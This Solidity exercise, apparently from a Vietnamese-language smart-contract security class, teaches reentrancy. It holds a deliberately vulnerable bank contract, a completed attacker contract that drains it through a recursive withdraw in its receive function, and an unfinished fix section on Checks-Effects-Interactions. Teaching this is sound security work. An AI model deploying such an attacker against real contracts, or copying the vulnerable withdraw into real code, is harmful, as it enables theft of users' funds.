// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ============================================================
//  PHẦN CHO SẴN — Bank CÓ LỖ HỔNG (cố tình viết sai)
// ============================================================
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        require(msg.value > 0, "Amount must be > 0");
        balances[msg.sender] += msg.value;
    }

    // BUG: chuyển ETH TRƯỚC, trừ sổ SAU -> dính reentrancy
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        (bool ok, ) = msg.sender.call{value: _amount}("");
        require(ok, "Transfer failed");
        balances[msg.sender] -= _amount; // trừ sổ SAU khi đã chuyển tiền
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// ============================================================
//  PHẦN 1 — BẠN VIẾT: contract tấn công
// ============================================================
contract Attacker {
    // TODO 1: VulnerableBank public bank;  +  address public owner;
    VulnerableBank public bank;
    address public owner;
    // TODO 2: constructor(address _bankAddress) { gán bank, owner }
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        owner = msg.sender;
    }
    // TODO 3: attack() payable
    //         - require msg.value > 0
    //         - bank.deposit{value: msg.value}()
    //         - bank.withdraw(msg.value)
    function attack() public payable {
        require(msg.value > 0, "Amount must be > 0");
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }
     // TODO 4: receive() external payable
    //         - nếu address(bank).balance >= msg.value -> bank.withdraw(msg.value)
    receive() external payable{
        if (address(bank).balance >= msg.value) {
            bank.withdraw(msg.value);
        }
    }
    // TODO 5: collect() -> chuyển hết ETH của contract này về owner
    function collect()  public {
        require(msg.sender == owner, "Only owner can collect");
        payable(owner).transfer(address(this).balance);
    }
    // Câu hỏi tư duy 1: vì sao đặt logic tấn công trong receive()?
    // => ...
}

// ============================================================
//  PHẦN 2 — BẠN VIẾT: bản vá an toàn
// ============================================================
contract SafeBank {
    // TODO: copy VulnerableBank rồi sửa:
    //   - withdraw theo Checks-Effects-Interactions (trừ sổ TRƯỚC)
    //   - thêm modifier nonReentrant và gắn vào withdraw

    // Câu hỏi tư duy 2: CEI vs nonReentrant — cách nào trị gốc? Dùng cả hai?
    // => ...
}
